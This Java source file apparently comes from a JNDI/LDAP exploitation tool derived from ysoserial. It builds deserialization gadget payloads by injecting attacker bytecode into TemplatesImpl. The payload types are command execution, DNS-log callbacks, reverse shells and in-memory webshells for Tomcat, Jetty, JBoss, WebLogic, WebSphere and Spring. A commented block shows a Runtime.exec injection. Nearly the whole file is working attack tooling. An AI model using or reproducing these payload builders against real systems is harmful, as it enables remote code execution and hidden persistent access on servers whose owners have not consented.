package com.feihong.ldap.gadgets.utils;

import com.feihong.ldap.template.*;
import com.feihong.ldap.utils.Cache;
import com.feihong.ldap.enumtypes.PayloadType;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
        "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }


    public static Object createTemplatesImpl (PayloadType type, String... param) throws Exception {
        if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
            return createTemplatesImpl(
                    type,
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"),
                    param);
        }

        return createTemplatesImpl(type, TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class, param);
    }


    public static <T> T createTemplatesImpl (PayloadType type, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory, String... param)
            throws Exception {
        final T templates = tplClass.newInstance();

//        // use template gadget class
//        ClassPool pool = ClassPool.getDefault();
//        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
//        pool.insertClassPath(new ClassClassPath(abstTranslet));
//        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
//        // run command in static initializer
//        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
//        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
//                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
//                "\");";
//        clazz.makeClassInitializer().insertAfter(cmd);
//        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
//        clazz.setName("ysoserial.Pwner" + System.nanoTime());
//        CtClass superC = pool.get(abstTranslet.getName());
//        clazz.setSuperclass(superC);

        byte[] classBytes = null;
        switch (type){
            case command:
                CommandTemplate commandTemplate = new CommandTemplate(param[0]);
                classBytes = commandTemplate.getBytes();
                break;
            case dnslog:
                DnslogTemplate dnslogTemplate = new DnslogTemplate(param[0]);
                classBytes = dnslogTemplate.getBytes();
                break;
            case reverseshell:
                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(param[0], param[1]);
                classBytes = reverseShellTemplate.getBytes();
                break;
            case tomcatecho:
                classBytes = Cache.get("TomcatEchoTemplate");
                break;
            case springecho:
                classBytes = Cache.get("SpringEchoTemplate");
                break;
            case weblogicecho:
                classBytes = Cache.get("WeblogicEchoTemplate");
                break;
            case tomcatmemshell1:
                classBytes = Cache.get("TomcatMemshellTemplate1");
                break;
            case tomcatmemshell2:
                classBytes = Cache.get("TomcatMemshellTemplate2");
                break;
            case jettymemshell:
                classBytes = Cache.get("JettyMemshellTemplate");
                break;
            case jbossmemshell:
                classBytes = Cache.get("JBossMemshellTemplate");
                break;
            case weblogicmemshell1:
                classBytes = Cache.get("WeblogicMemshellTemplate1");
                break;
            case weblogicmemshell2:
                classBytes = Cache.get("WeblogicMemshellTemplate2");
                break;
            case webspherememshell:
                classBytes = Cache.get("WebsphereMemshellTemplate");
                break;
            case springmemshell:
                classBytes = Cache.get("SpringMemshellTemplate");
                break;
        }

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
                classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }


    public static HashMap makeMap(Object v1, Object v2) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}

